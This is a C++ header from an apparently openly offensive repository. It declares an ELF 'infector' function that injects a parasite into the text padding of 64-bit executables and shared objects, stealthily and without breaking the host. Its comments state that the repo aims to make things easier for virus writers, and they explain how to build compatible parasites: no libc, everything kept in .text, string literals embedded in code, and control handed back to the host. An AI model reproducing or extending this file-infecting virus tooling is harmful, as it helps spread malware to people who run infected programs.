#pragma once
#include "common/mmap.hh"

namespace vt::infector {
// This algorithm injects a parasite into an elf's text padding. It has the
// following characteristics:
//  - It infects 64 bit elfs.
//  - It infects ET_DYN (most common) and ET_EXEC.
//  - File size and attributes are the same.
//  - Original host code is undamaged. It will still run.
//  - It's possible to infect an infected host again. In other words, caller
//    should handle skipping logic.
//
// Parasite writers should be aware of the following limitations:
//  - Do not link with other libraries (no glibc). This repo strives to
//    make it easier for virus writers by providing our own version of various
//    bits.
//  - Must be self-contained in .text section. In other words, no .data/.bss
//    sections for global variables, no errno, no environ (however we route
//    host's environ to main).
//  - No string literals. Similiar to the previous item, it would cause the
//    parasite to use things in .rodata. However, since some syscalls requires
//    initialized strings, we provided a string macro to use string literals in
//    .text to work around this.(Using a common technique in buffer overflow
//    attack)
//  - No fancy C++ things that will need to be used outside of .text.
//
// Other limitations and assumptions but are taken care of for you:
//  - entry (_start) must be at the beginning of the .text (we provided a custom
//    linker script to help with that automatically)
//  - must contain certain signatures which can be patched to resume control
//    back to the host. (our _start provided this already and is linked inside a
//    parasite binary bazel macro for you)
bool padding_infect64(const char* host_path, const char* parasite_path);

bool padding_infect64(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                      common::Mmap<PROT_READ> parasite_mapping);
}  // namespace vt::infector